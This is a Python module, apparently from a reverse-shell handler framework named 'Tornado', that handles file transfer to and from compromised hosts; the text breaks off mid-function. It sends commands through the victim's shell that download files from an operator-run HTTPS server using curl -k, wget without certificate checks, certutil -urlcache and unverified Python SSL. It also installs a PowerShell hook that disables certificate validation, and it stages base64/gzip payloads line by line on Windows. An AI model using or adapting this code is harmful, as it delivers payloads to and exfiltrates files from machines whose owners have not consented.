import base64
import hashlib
import json
import os
import re
import socket
import ssl
import time
import random
import socketserver
import threading
import urllib.parse
import http.server
from .constants import XFER_MARK_END, XFER_MARK_START, XFER_STATE_SUFFIX


class FileTransfer:
    """Chunked file upload/download with integrity checks and resume support."""

    def __init__(self, handler):
        self.h = handler

    def _state_path(self, local_path, remote_path, direction):
        key = f"{direction}|{os.path.abspath(local_path)}|{remote_path}"
        digest = hashlib.sha256(key.encode()).hexdigest()[:16]
        base = os.path.dirname(os.path.abspath(local_path)) or '.'
        return os.path.join(base, f".tornado_{digest}{XFER_STATE_SUFFIX}")

    def _load_state(self, path):
        if not os.path.isfile(path):
            return None
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except (OSError, json.JSONDecodeError):
            return None

    def _save_state(self, path, state):
        try:
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(state, f, indent=2)
        except OSError:
            pass

    def _clear_state(self, path):
        try:
            if os.path.isfile(path):
                os.remove(path)
        except OSError:
            pass

    def _format_size(self, nbytes):
        return self.h._format_size(nbytes)

    def _print_progress(self, transferred, total, start_time, label='Transfer'):
        self.h._print_progress(transferred, total, start_time, label)

    def _log_transfer(self, client_sock, direction, local_path, remote_path, status, detail=''):
        logger = self.h._get_session_logger(client_sock)
        if logger:
            logger.log_transfer(direction, local_path, remote_path, status, detail)
            
    def _run_ps(self, client_sock, ps, timeout=30.0):
        try:
            if not self.h._send_win_ps(client_sock, ps):
                return ''
        except Exception:
            return ''
        return self.h.recv_output(client_sock, timeout=timeout) or ''

    def _resolve_remote_target(self, client_sock, shell_type, remote_path, local_path):
        basename = os.path.basename(local_path)
        if not basename:
            return remote_path

        if remote_path.endswith('/') or remote_path.endswith('\\'):
            sep = '\\' if shell_type == 'windows' else '/'
            stripped = remote_path.rstrip('/\\')
            return f"{stripped}{sep}{basename}"

        if shell_type == 'windows':
            esc = remote_path.replace("'", "''")
            check = (
                f"if (Test-Path -LiteralPath '{esc}' -PathType Container) "
                f"{{ Write-Output 'TORNADO_ISDIR' }} "
                f"else {{ Write-Output 'TORNADO_NOTDIR' }}"
            )
            out = self._run_ps(client_sock, check, timeout=8.0)
            if 'TORNADO_ISDIR' in (out or ''):
                stripped = remote_path.rstrip('/\\')
                return f"{stripped}\\{basename}"

        elif shell_type in ('linux', 'unix'):
            esc = remote_path.replace("'", "'\\''")
            check = (
                f"if [ -d '{esc}' ]; then echo TORNADO_ISDIR; "
                f"else echo TORNADO_NOTDIR; fi"
            )
            try:
                self.h._flush_shell(client_sock, timeout=0.3)
                self.h.send_to_revshell(client_sock, check)
                out = self.h.recv_output(client_sock, timeout=8.0) or ''
                if 'TORNADO_ISDIR' in out:
                    stripped = remote_path.rstrip('/')
                    return f"{stripped}/{basename}"
            except Exception:
                pass

        return remote_path

    def _resolve_bind_ip(self, spec):
        if not spec:
            return '0.0.0.0'
        if re.match(r'^\d+\.\d+\.\d+\.\d+$', spec):
            return spec

        try:
            import psutil
            for iface, addrs in psutil.net_if_addrs().items():
                if iface == spec:
                    for a in addrs:
                        if a.family == socket.AF_INET:
                            return a.address
        except Exception:
            pass

        try:
            import subprocess
            result = subprocess.run(
                ['ip', '-4', '-o', 'addr', 'show', spec],
                capture_output=True, text=True, timeout=3,
            )
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    parts = line.split()
                    if len(parts) >= 4 and parts[2] == 'inet':
                        return parts[3].split('/')[0]
        except Exception:
            pass

        try:
            import subprocess
            result = subprocess.run(
                ['ifconfig', spec],
                capture_output=True, text=True, timeout=3,
            )
            if result.returncode == 0:
                m = re.search(r'inet\s+(?:addr:)?(\d+\.\d+\.\d+\.\d+)',
                              result.stdout)
                if m:
                    return m.group(1)
        except Exception:
            pass

        return None

    def _make_https_context(self):
        certfile = getattr(self.h, 'certfile', None)
        keyfile = getattr(self.h, 'keyfile', None)
        if not certfile or not keyfile:
            return None
        if not (os.path.isfile(certfile) and os.path.isfile(keyfile)):
            return None
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            ctx.options |= ssl.OP_NO_COMPRESSION
            return ctx
        except (ssl.SSLError, OSError) as e:
            print(f"{self.h.colors['red']}Failed to build TLS context: "
                  f"{e}{self.h.colors['end']}")
            return None
    def _upload_via_https(self, client_sock, local_path, remote_path,
                          https_bind=None, rh_host=None, rh_port=None):
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
            return False
        shell_type = info.get('type', 'unknown')

        if not os.path.isfile(local_path):
            print(f"{self.h.colors['red']}Local file not found: {local_path}"
                  f"{self.h.colors['end']}")
            return False

        total = os.path.getsize(local_path)
        local_hash = self.h._sha256_file(local_path)
        state_path = self._state_path(local_path, remote_path, 'upload')

        try:
            with open(local_path, 'rb') as f:
                content = f.read()
        except OSError as e:
            print(f"{self.h.colors['red']}Failed to read local file: {e}"
                  f"{self.h.colors['end']}")
            return False

        bind_ip = self._resolve_bind_ip(https_bind)
        if bind_ip is None:
            print(f"{self.h.colors['red']}Could not resolve interface "
                  f"'{https_bind}' to an IP address.{self.h.colors['end']}")
            return False

        tls_ctx = self._make_https_context()
        if tls_ctx is None:
            print(f"{self.h.colors['red']}Could not build TLS context — "
                  f"check tls_certs/server.pem and tls_certs/server.key"
                  f"{self.h.colors['end']}")
            return False

        try:
            port, thread, stop_event, server = self._start_agent_http_server(
                content, port=rh_port, path='/file', bind_ip=bind_ip,
                tls_context=tls_ctx,
            )
        except OSError as e:
            print(f"{self.h.colors['red']}HTTPS server start failed on "
                  f"{bind_ip}:{rh_port or 'any'}: {e}{self.h.colors['end']}")
            return False

        if rh_host:
            advertise_ip = rh_host
        elif bind_ip != '0.0.0.0':
            advertise_ip = bind_ip
        else:
            try:
                advertise_ip = client_sock.getsockname()[0]
            except Exception:
                advertise_ip = '127.0.0.1'

        url = f"https://{advertise_ip}:{port}/file"

        c = self.h.colors
        print(f"{c['yellow']}HTTPS server started:{c['end']}")
        print(f"  Bind:      {bind_ip}:{port}")
        print(f"  Advertise: {advertise_ip}:{port}")
        print(f"  URL:       {url}")
        print(f"{c['yellow']}Uploading {local_path} -> {remote_path} "
              f"({self._format_size(total)}) via HTTPS{c['end']}")
        print(f"{c['blue']}Local SHA256: {local_hash}{c['end']}")

        self.h._flush_shell(client_sock)
        escaped = remote_path.replace("'", "''")

        if shell_type == 'windows':
            ps_cmd = (
                f"$ErrorActionPreference='Stop'; "
                f"$url='{url}'; $out='{escaped}'; "
                f"$done=$false; $log=''; "
                # --- install a Runspace-free cert bypass via a compiled static method ---
                f"try {{ "
                f"  Add-Type -TypeDefinition "
                f"'using System;using System.Net;using System.Security.Cryptography.X509Certificates;"
                f"public static class TornadoTrust {{ "
                f"public static bool All(object s, X509Certificate c, X509Chain ch, "
                f"System.Net.Security.SslPolicyErrors e) {{ return true; }} }}' "
                f"-ErrorAction SilentlyContinue; "
                f"  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = [TornadoTrust]::All; "
                f"  [Net.ServicePointManager]::SecurityProtocol = "
                f"[Net.SecurityProtocolType]::Tls12 -bor "
                f"[Net.SecurityProtocolType]::Tls11 -bor "
                f"[Net.SecurityProtocolType]::Tls "
                f"}} catch {{ $log += ' [ADD-TYPE:' + $_.Exception.Message + ']' }}; "
                # --- try 1: curl.exe (Win10 1803+, Win11) ---
                f"if (-not $done) {{ try {{ "
                f"  $curl = Get-Command curl.exe -EA SilentlyContinue; "
                f"  if ($curl) {{ "
                f"    & curl.exe -k -fsSL $url -o $out 2>$null; "
                f"    if (Test-Path -LiteralPath $out) {{ $done=$true }} "
                f"    else {{ $log+=' [CURL:no-file]' }} "
                f"  }} else {{ $log+=' [CURL:not-present]' }} "
                f"}} catch {{ $log += ' [CURL:' + $_.Exception.Message + ']' }} }}; "
                # --- try 2: Invoke-WebRequest with the fixed callback ---
                f"if (-not $done) {{ try {{ "
                f"  Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing "
                f"-TimeoutSec 30 -ErrorAction Stop; "
                f"  $done=$true "
                f"}} catch {{ "
                f"  $log += ' [IWR:' + $_.Exception.Message; "
                f"  if ($_.Exception.InnerException) {{ $log += ' / ' + $_.Exception.InnerException.Message }}; "
                f"  $log += ']' "
                f"}} }}; "
                # --- try 3: certutil ---
                f"if (-not $done) {{ try {{ "
                f"  certutil -urlcache -split -f $url $out | Out-Null; "
                f"  if (Test-Path -LiteralPath $out) {{ $done=$true }} "
                f"  else {{ $log+=' [CERTUTIL:no-file]' }} "
                f"}} catch {{ $log += ' [CERTUTIL:' + $_.Exception.Message + ']' }} }}; "
                f"if ($done) {{ Write-Output '{XFER_MARK_START}OK{XFER_MARK_END}' }} "
                f"else {{ Write-Output ('{XFER_MARK_START}FAIL:' + $log + '{XFER_MARK_END}') }}"
            )
            client_sock.sendall((ps_cmd + '\n').encode('utf-8'))

        else:
            esc_url = url.replace("'", "'\\''")
            cmd = (
                # curl with explicit TLS 1.2 floor (older curl builds default to 1.0)
                f"("
                f"curl -k --tlsv1.2 -fsSL '{esc_url}' -o '{escaped}' && "
                f"echo '{XFER_MARK_START}OK{XFER_MARK_END}'"
                f") || ("
                # plain curl, in case --tlsv1.2 isn't recognised by this build
                f"curl -k -fsSL '{esc_url}' -o '{escaped}' && "
                f"echo '{XFER_MARK_START}OK{XFER_MARK_END}'"
                f") || ("
                # wget with explicit TLS 1.2
                f"wget --no-check-certificate --secure-protocol=TLSv1_2 "
                f"-q -O '{escaped}' '{esc_url}' && "
                f"echo '{XFER_MARK_START}OK{XFER_MARK_END}'"
                f") || ("
                # plain wget fallback
                f"wget --no-check-certificate -q -O '{escaped}' '{esc_url}' && "
                f"echo '{XFER_MARK_START}OK{XFER_MARK_END}'"
                f") || ("
                # python3 — force TLS 1.2 floor on the SSL context
                f"python3 -c \"import ssl,urllib.request;"
                f"ctx=ssl._create_unverified_context();"
                f"ctx.minimum_version=getattr(ssl,'TLSVersion',None)"
                f" and ssl.TLSVersion.TLSv1_2;"
                f"r=urllib.request.urlopen('{esc_url}',context=ctx);"
                f"open('{escaped}','wb').write(r.read())\" && "
                f"echo '{XFER_MARK_START}OK{XFER_MARK_END}'"
                f") || ("
                # python2 — build an HTTPSHandler with a context
                f"python -c \"import ssl,urllib2;"
                f"ctx=ssl._create_unverified_context();"
                f"h=urllib2.HTTPSHandler(context=ctx);"
                f"o=urllib2.build_opener(h);"
                f"r=o.open('{esc_url}');"
                f"open('{escaped}','wb').write(r.read())\" && "
                f"echo '{XFER_MARK_START}OK{XFER_MARK_END}'"
                f") || echo '{XFER_MARK_START}FAIL{XFER_MARK_END}'"
            )
            client_sock.sendall((cmd + '\n').encode('utf-8'))

        start_time = time.time()
        timeout = 600.0
        output = b''
        marker_start = XFER_MARK_START.encode()
        marker_end = XFER_MARK_END.encode()

        while time.time() - start_time < timeout:
            try:
                chunk = client_sock.recv(4096)
                if not chunk:
                    break
                output += chunk
                if marker_start in output and marker_end in output:
                    break
            except Exception:
                break

        stop_event.set()
        thread.join(timeout=2.0)

        result = None
        try:
            si = output.find(marker_start) + len(marker_start)
            ei = output.find(marker_end, si)
            if si != -1 and ei != -1:
                result = output[si:ei].decode('utf-8', errors='replace').strip()
        except Exception:
            pass

        if result != 'OK':
            detail = result or 'no response'
            print(f"{self.h.colors['red']}HTTPS upload failed "
                  f"(target download error: {detail})"
                  f"{self.h.colors['end']}")
            self._log_transfer(client_sock, 'upload', local_path, remote_path,
                               'failed', f'https:{detail}')
            return False

        print(f"{self.h.colors['yellow']}Verifying remote integrity..."
              f"{self.h.colors['end']}", end='', flush=True)
        remote_hash = self.h._remote_sha256(client_sock, remote_path, shell_type)
        if remote_hash == local_hash:
            print(f"\r{self.h.colors['green']}Integrity verified — SHA256 match"
                  f"{self.h.colors['end']}          ")
            print(f"{self.h.colors['green']}Upload complete: {remote_path}"
                  f"{self.h.colors['end']}")
            self._clear_state(state_path)
            self._log_transfer(client_sock, 'upload', local_path, remote_path,
                               'complete')
            return True

        print(f"\r{self.h.colors['red']}Integrity mismatch!"
              f"{self.h.colors['end']}")
        print(f"  Local:  {local_hash}")
        print(f"  Remote: {remote_hash or 'unavailable'}")
        self._log_transfer(client_sock, 'upload', local_path, remote_path,
                           'hash_mismatch')
        return False

    def _stage_windows_via_lines(self, client_sock, local_path, remote_path,
                                 resume=False, state_path=None):
        try:
            with open(local_path, 'rb') as f:
                raw = f.read()
        except OSError as e:
            print(f"{self.h.colors['red']}Failed to read local file: {e}{self.h.colors['end']}")
            return False, 0

        total_raw = len(raw)
        local_hash = hashlib.sha256(raw).hexdigest()
        esc_path = remote_path.replace("'", "''")
        b64_path = remote_path + '.b64'
        esc_b64 = b64_path.replace("'", "''")

        if total_raw == 0:
            create = f"[IO.File]::WriteAllBytes('{esc_path}', @())"
            self._run_ps(client_sock, create, timeout=10.0)
            return True, 0

        use_gzip = False
        payload = raw
        try:
            import gzip as _gzip
            compressed = _gzip.compress(raw, compresslevel=6)
            if len(compressed) < total_raw * 0.9:
                payload = compressed
                use_gzip = True
        except Exception:
            pass

        total_payload = len(payload)
        if use_gzip and total_raw > 64 * 1024:
            print(
                f"{self.h.colors['blue']}Compressed "
                f"{self._format_size(total_raw)} -> "
                f"{self._format_size(total_payload)} "
                f"({100 * total_payload // max(total_raw, 1)}% of original)"
                f"{self.h.colors['end']}"
            )

        info = self.h._client_info(client_sock) or {}
        shell_kind = info.get('win_shell', 'cmd')
        if shell_kind == 'powershell':
            LINE = 3000
            BATCH = 4
        else:
            LINE = 384
            BATCH = 6

        b64_data = base64.b64encode(payload).decode('ascii')
        lines = [b64_data[i:i + LINE] for i in range(0, len(b64_data), LINE)]
        total_lines = len(lines)
        start_line = 0

        if resume and state_path:
            state = self._load_state(state_path) or {}
            state_ok = (
                state.get('transport') == 'windows-lines'
                and state.get('local_path') == os.path.abspath(local_path)
                and state.get('remote_path') == remote_path
                and state.get('sha256') == local_hash
                and state.get('use_gzip') == use_gzip
                and state.get('total_payload') == total_payload
            )
            if state_ok:
                check_ps = (
                    f"if (Test-Path -LiteralPath '{esc_b64}') {{ "
                    f"  $c = @(Get-Content -LiteralPath '{esc_b64}' -EA 0).Count; "
                    f"  Write-Output ('TORNADO_LINES:' + $c) "
                    f"}} else {{ Write-Output 'TORNADO_LINES:0' }}"
                )
                out = self._run_ps(client_sock, check_ps, timeout=15.0) or ''
                m = re.search(r'TORNADO_LINES:(\d+)', out)
                if m:
                    on_target = int(m.group(1))
                    if 0 < on_target <= total_lines:
                        last = self._run_ps(
                            client_sock,
                            f"Get-Content -LiteralPath '{esc_b64}' -Tail 1 -EA 0",
                            timeout=15.0,
                        ) or ''
                        last = last.strip()
                        if last == lines[on_target - 1]:
                            start_line = on_target
                            print(
                                f"{self.h.colors['yellow']}Resuming upload from "
                                f"line {start_line}/{total_lines}{self.h.colors['end']}"
                            )
                        else:
                            print(
                                f"{self.h.colors['yellow']}Accumulator last-line "
                                f"mismatch — restarting{self.h.colors['end']}"
                            )
                    elif on_target == total_lines:
                        start_line = on_target
                        print(
                            f"{self.h.colors['yellow']}Accumulator already "
                            f"complete — skipping to decode{self.h.colors['end']}"
                        )
            elif state:
                print(f"{self.h.colors['yellow']}Stale state ignored — restarting"
                      f"{self.h.colors['end']}")

        if start_line == 0:
            reset = (
                f"Remove-Item -LiteralPath '{esc_b64}' -Force -EA 0; "
                f"New-Item -ItemType File -Path '{esc_b64}' -Force | Out-Null; "
                f"Write-Output 'RESET_OK'"
            )
            self._run_ps(client_sock, reset, timeout=10.0)

        if state_path:
            self._save_state(state_path, {
                'direction': 'upload',
                'transport': 'windows-lines',
                'local_path': os.path.abspath(local_path),
                'remote_path': remote_path,
                'sha256': local_hash,
                'total': total_raw,
                'total_payload': total_payload,
                'use_gzip': use_gzip,
                'line_size': LINE,
                'line_index': start_line,
                'line_total': total_lines,
            })

        start = time.time()
        idx = start_line

        while idx < total_lines:
            group = lines[idx:idx + BATCH]
            script = '; '.join(
                f"Add-Content -LiteralPath '{esc_b64}' -Value '{c}' -EA 0"
                for c in group
            )
            self._run_ps(client_sock, script, timeout=30.0)
            idx += len(group)

            if state_path:
                self._save_state(state_path, {
                    'direction': 'upload',
                    'transport': 'windows-lines',
                    'local_path': os.path.abspath(local_path),
                    'remote_path': remote_path,
                    'sha256': local_hash,
                    'total': total_raw,
                    'total_payload': total_payload,
                    'use_gzip': use_gzip,
                    'line_size': LINE,
                    'line_index': idx,
                    'line_total': total_lines,
                })

            if total_raw > 64 * 1024:
                bytes_sent_b64 = min(len(b64_data), idx * LINE)
                raw_compressed = int(bytes_sent_b64 * 3 / 4)
                if use_gzip and total_payload > 0:
                    raw_sent = int(raw_compressed * total_raw / total_payload)
                else:
                    raw_sent = raw_compressed
                self._print_progress(raw_sent, total_raw, start, 'Upload')

        if use_gzip:
            decode = (
                f"$ErrorActionPreference='SilentlyContinue'; "
                f"Add-Type -AssemblyName System.IO.Compression -EA 0; "
                f"$raw = Get-Content -Raw -LiteralPath '{esc_b64}' -EA 0; "
                f"if (-not $raw) {{ Write-Output 'DECODE_FAIL:empty' }} else {{ "
                f"  $clean = $raw -replace '\\s', ''; "
                f"  try {{ "
                f"    $bytes = [Convert]::FromBase64String($clean); "
                f"    $in  = New-Object IO.MemoryStream(,$bytes); "
                f"    $gz  = New-Object IO.Compression.GZipStream("
                f"$in, [IO.Compression.CompressionMode]::Decompress); "
                f"    $out = New-Object IO.MemoryStream; "
                f"    $gz.CopyTo($out); $gz.Close(); $in.Close(); "
                f"    [IO.File]::WriteAllBytes('{esc_path}', $out.ToArray()); "
                f"    $out.Close(); "
                f"    Remove-Item -LiteralPath '{esc_b64}' -Force -EA 0; "
                f"    Write-Output 'DECODE_OK' "
                f"  }} catch {{ Write-Output ('DECODE_FAIL:' + $_.Exception.Message) }} "
                f"}}"
            )
        else:
            decode = (
                f"$raw = Get-Content -Raw -LiteralPath '{esc_b64}' -EA 0; "
                f"if (-not $raw) {{ Write-Output 'DECODE_FAIL:empty' }} else {{ "
                f"  $clean = $raw -replace '\\s', ''; "
                f"  try {{ "
                f"    $bytes = [Convert]::FromBase64String($clean); "
                f"    [IO.File]::WriteAllBytes('{esc_path}', $bytes); "
                f"    Remove-Item -LiteralPath '{esc_b64}' -Force -EA 0; "
                f"    Write-Output 'DECODE_OK' "
                f"  }} catch {{ Write-Output ('DECODE_FAIL:' + $_.Exception.Message) }} "
                f"}}"
            )

        out = self._run_ps(client_sock, decode, timeout=180.0)

        if total_raw > 64 * 1024:
            print()

        if 'DECODE_OK' not in (out or ''):
            print(f"{self.h.colors['red']}Decode failed on target: "
                  f"{(out or '')[:300]}{self.h.colors['end']}")
            return False, 0

        return True, total_lines

    def _start_agent_http_server(self, content, port=None, path='/agent.py',
                                 bind_ip='0.0.0.0', tls_context=None):
        handler_cls = self._make_agent_handler(content, path)

        if tls_context is not None:
            class _TLSServer(socketserver.TCPServer):
                allow_reuse_address = True

                def __init__(self, addr, handler):
                    self._tls_ctx = tls_context
                    super().__init__(addr, handler)

                def get_request(self):
                    sock, addr = super().get_request()
                    try:
                        sock = self._tls_ctx.wrap_socket(sock, server_side=True)
                    except (ssl.SSLError, OSError):
                        try:
                            sock.close()
                        except OSError:
                            pass
                        raise
                    return sock, addr

                def handle_error(self, request, client_address):
                    pass

            server_cls = _TLSServer
        else:
            class _PlainServer(socketserver.TCPServer):
                allow_reuse_address = True
            server_cls = _PlainServer

        if port is None:
            server = server_cls((bind_ip, 0), handler_cls)
            port = server.server_address[1]
        else:
            server = server_cls((bind_ip, port), handler_cls)

        stop_event = threading.Event()
        def serve():
            while not stop_event.is_set():
                try:
                    server.handle_request()
                except OSError:
                    break
            server.server_close()
        thread = threading.Thread(target=serve, daemon=True)
        thread.start()
        return port, thread, stop_event, server

    def _make_agent_handler(self, content, path='/agent.py'):
        """Factory for a request handler that serves the given content on a specific path."""
        class AgentHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                if parsed.path == path:
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/octet-stream')
                    self.send_header('Content-Length', str(len(content)))
                    self.end_headers()
                    self.wfile.write(content)
                else:
                    self.send_response(404)
                    self.end_headers()
            def log_message(self, format, *args):
                pass
        return AgentHandler

    def upload_file(self, client_sock, local_path, remote_path, resume=False,
                    use_https=False, https_bind=None, rh_host=None, rh_port=None):
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
            return False
        shell_type = info.get('type', 'unknown')

        if not os.path.isfile(local_path):
            print(f"{self.h.colors['red']}Local file not found: {local_path}{self.h.colors['end']}")
            return False

        original_remote = remote_path
        remote_path = self._resolve_remote_target(
            client_sock, shell_type, remote_path, local_path
        )
        if remote_path != original_remote:
            print(
                f"{self.h.colors['blue']}Remote path resolved: "
                f"{original_remote} -> {remote_path}{self.h.colors['end']}"
            )

        if use_https:
            if resume:
                print(f"{self.h.colors['yellow']}Resume is not supported for "
                      f"HTTPS uploads — performing full upload"
                      f"{self.h.colors['end']}")
            return self._upload_via_https(
                client_sock, local_path, remote_path,
                https_bind=https_bind, rh_host=rh_host, rh_port=rh_port,
            )

        total = os.path.getsize(local_path)
        local_hash = self.h._sha256_file(local_path)
        state_path = self._state_path(local_path, remote_path, 'upload')

        # ---------- WINDOWS: line-based staging ----------
        if shell_type == 'windows':
            if total > 512 * 1024:
                print(
                    f"{self.h.colors['yellow']}Note: {self._format_size(total)} via "
                    f"line-based staging will take a while "
                    f"(~{total // (60 * 1024)}s on cmd.exe sessions)"
                    f"{self.h.colors['end']}"
                )

            mode = "resuming" if resume else "uploading"
            print(
                f"{self.h.colors['yellow']}{mode.capitalize()} {local_path} -> {remote_path} "
                f"({self._format_size(total)}) via line-based staging{self.h.colors['end']}"
            )
            print(f"{self.h.colors['blue']}Local SHA256: {local_hash}{self.h.colors['end']}")

            self.h._flush_shell(client_sock)

            ok, _ = self._stage_windows_via_lines(
                client_sock, local_path, remote_path,
                resume=resume, state_path=state_path,
            )
            if not ok:
                self._log_transfer(client_sock, 'upload', local_path, remote_path,
                                   'interrupted', 'staging')
                print(
                    f"{self.h.colors['red']}Upload failed — resume with: "
                    f"upload --resume <local> <remote>{self.h.colors['end']}"
                )
                return False

            print(f"{self.h.colors['yellow']}Verifying remote integrity...{self.h.colors['end']}",
                  end='', flush=True)
            remote_hash = self.h._remote_sha256(client_sock, remote_path, shell_type)
            if remote_hash == local_hash:
                print(f"\r{self.h.colors['green']}Integrity verified — SHA256 match"
                      f"{self.h.colors['end']}          ")
                print(f"{self.h.colors['green']}Upload complete: {remote_path}{self.h.colors['end']}")
                self._clear_state(state_path)
                self._log_transfer(client_sock, 'upload', local_path, remote_path, 'complete')
                return True

            print(f"\r{self.h.colors['red']}Integrity mismatch!{self.h.colors['end']}                          ")
            print(f"  Local:  {local_hash}")
            print(f"  Remote: {remote_hash or 'unavailable'}")
            self._log_transfer(client_sock, 'upload', local_path, remote_path, 'hash_mismatch')
            return False

        # ---------- Non‑Windows (Linux, macOS, etc.): original chunked upload (unchanged) ----------
        chunk_size = self.h._write_chunk_size(remote_path, shell_type)
        state = self._load_state(state_path)
        transferred = 0
        first = True

        if resume and state:
            if (state.get('local_path') == os.path.abspath(local_path)
                    and state.get('remote_path') == remote_path
                    and state.get('direction') == 'upload'
                    and state.get('total') == total
                    and state.get('sha256') == local_hash):
                transferred = min(state.get('transferred', 0), total)
                if transferred > 0:
                    print(
                        f"{self.h.colors['yellow']}Resuming upload from "
                        f"{self._format_size(transferred)}{self.h.colors['end']}"
                    )
                    first = False
            else:
                print(f"{self.h.colors['yellow']}Stale resume state ignored{self.h.colors['end']}")
                self._clear_state(state_path)
        elif resume:
            remote_size = self.h._remote_file_size(client_sock, remote_path, shell_type)
            if remote_size and 0 < remote_size < total:
                aligned = (remote_size // chunk_size) * chunk_size if chunk_size else remote_size
                if aligned == 0:
                    transferred = 0
                    first = True
                else:
                    verify_len = min(4096, aligned)
                    verify_offset = aligned - verify_len
                    probe = self.h._remote_read_chunk(
                        client_sock, remote_path, verify_offset, verify_len,
                        shell_type, verify_offset // (chunk_size or 1),
                    )
                    local_prefix = b''
                    try:
                        with open(local_path, 'rb') as fh:
                            fh.seek(verify_offset)
                            local_prefix = fh.read(verify_len)
                    except OSError:
                        local_prefix = b''

                    if probe is not None and probe == local_prefix:
                        transferred = aligned
                        print(
                            f"{self.h.colors['yellow']}Resuming upload from "
                            f"remote offset {self._format_size(transferred)} "
                            f"(verified, chunk-aligned)"
                            f"{self.h.colors['end']}"
                        )
                        first = False
                    else:
                        print(
                            f"{self.h.colors['yellow']}Remote file tail mismatch "
                            f"at offset {self._format_size(aligned)} — "
                            f"restarting{self.h.colors['end']}"
                        )
                        transferred = 0
                        first = True
            elif remote_size == 0:
                transferred = 0
                first = True

        print(
            f"{self.h.colors['yellow']}Uploading {local_path} -> {remote_path} "
            f"({self._format_size(total)}, chunk={self._format_size(chunk_size)}){self.h.colors['end']}"
        )
        print(f"{self.h.colors['blue']}Local SHA256: {local_hash}{self.h.colors['end']}")
        self.h._flush_shell(client_sock)

        if transferred == 0:
            if not self.h._remote_truncate(client_sock, remote_path, shell_type):
                print(f"\n{self.h.colors['red']}Failed to prepare remote file{self.h.colors['end']}")
                self._log_transfer(client_sock, 'upload', local_path, remote_path, 'failed', 'truncate')
                return False
            self.h.recv_output(client_sock, timeout=2.0)
        else:
            self.h.recv_output(client_sock, timeout=1.0)

        start = time.time()
        try:
            with open(local_path, 'rb') as f:
                f.seek(transferred)
                while transferred < total:
                    data = f.read(chunk_size)
                    if not data:
                        break
                    if not self.h._remote_write_chunk(
                        client_sock, remote_path, data, shell_type, truncate=first, skip_flush=not first
                    ):
                        self._save_state(state_path, {
                            'direction': 'upload',
                            'local_path': os.path.abspath(local_path),
                            'remote_path': remote_path,
                            'transferred': transferred,
                            'total': total,
                            'sha256': local_hash,
                            'shell_type': shell_type,
                            'chunk_size': chunk_size,
                        })
                        print(
                            f"\n{self.h.colors['red']}Upload failed at "
                            f"{self._format_size(transferred)} — resume with: "
                            f"upload --resume <local> <remote>{self.h.colors['end']}"
                        )
                        self._log_transfer(
                            client_sock, 'upload', local_path, remote_path,
                            'interrupted', f"offset={transferred}"
                        )
                        return False
                    first = False
                    transferred += len(data)
                    self._save_state(state_path, {
                        'direction': 'upload',
                        'local_path': os.path.abspath(local_path),
                        'remote_path': remote_path,
                        'transferred': transferred,
                        'total': total,
                        'sha256': local_hash,
                        'shell_type': shell_type,
                        'chunk_size': chunk_size,
                    })
                    self._print_progress(transferred, total, start, 'Upload')
        except OSError as e:
            print(f"\n{self.h.colors['red']}Upload error: {e}{self.h.colors['end']}")
            self._log_transfer(client_sock, 'upload', local_path, remote_path, 'error', str(e))
            return False

        self.h._flush_shell(client_sock, timeout=1.0)
        print(f"\n{self.h.colors['yellow']}Verifying remote integrity...{self.h.colors['end']}", end='', flush=True)
        remote_hash = self.h._remote_sha256(client_sock, remote_path, shell_type)
        if remote_hash == local_hash:
            print(f"\r{self.h.colors['green']}Integrity verified — SHA256 match{self.h.colors['end']}          ")
            print(f"{self.h.colors['green']}Upload complete: {remote_path}{self.h.colors['end']}")
            self._clear_state(state_path)
            self._log_transfer(client_sock, 'upload', local_path, remote_path, 'complete')
            return True
        print(f"\r{self.h.colors['red']}Integrity mismatch!{self.h.colors['end']}                          ")
        print(f"  Local:  {local_hash}")
        print(f"  Remote: {remote_hash or 'unavailable'}")
        self._log_transfer(client_sock, 'upload', local_path, remote_path, 'hash_mismatch')
        return False

    def download_file(self, client_sock, remote_path, local_path, resume=False):
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
            return False
        shell_type = info.get('type', 'unknown')
        remote_size = self.h._remote_file_size(client_sock, remote_path, shell_type)
        if remote_size is None:
            print(f"{self.h.colors['red']}Remote file not found or unreadable: {remote_path}{self.h.colors['end']}")
            return False

        chunk_size = self.h._write_chunk_size(remote_path, shell_type)
        state_path = self._state_path(local_path, remote_path, 'download')
        state = self._load_state(state_path)
        transferred = 0
        mode = 'wb'

        if resume and state:
            if (state.get('local_path') == os.path.abspath(local_path)
                    and state.get('remote_path') == remote_path
                    and state.get('direction') == 'download'
                    and state.get('total') == remote_size):
                transferred = min(state.get('transferred', 0), remote_size)
                if transferred > 0:
                    print(
                        f"{self.h.colors['yellow']}Resuming download from "
                        f"{self._format_size(transferred)}{self.h.colors['end']}"
                    )
                    mode = 'r+b'
            else:
                print(f"{self.h.colors['yellow']}Stale resume state ignored{self.h.colors['end']}")
                self._clear_state(state_path)
        elif resume and os.path.isfile(local_path):
            local_partial = os.path.getsize(local_path)
            if 0 < local_partial < remote_size:
                aligned = (local_partial // chunk_size) * chunk_size if chunk_size else local_partial
                if aligned == 0:
                    transferred = 0
                    mode = 'wb'
                else:
                    verify_len = min(4096, aligned)
                    verify_offset = aligned - verify_len
                    probe = self.h._remote_read_chunk(
                        client_sock, remote_path, verify_offset, verify_len,
                        shell_type, verify_offset // (chunk_size or 1),
                    )
                    local_tail = b''
                    try:
                        with open(local_path, 'rb') as fh:
                            fh.seek(verify_offset)
                            local_tail = fh.read(verify_len)
                    except OSError:
                        local_tail = b''

                    if probe is not None and probe == local_tail:
                        transferred = aligned
                        mode = 'r+b'
                        print(
                            f"{self.h.colors['yellow']}Resuming download from "
                            f"local offset {self._format_size(transferred)} "
                            f"(verified, chunk-aligned)"
                            f"{self.h.colors['end']}"
                        )
                    else:
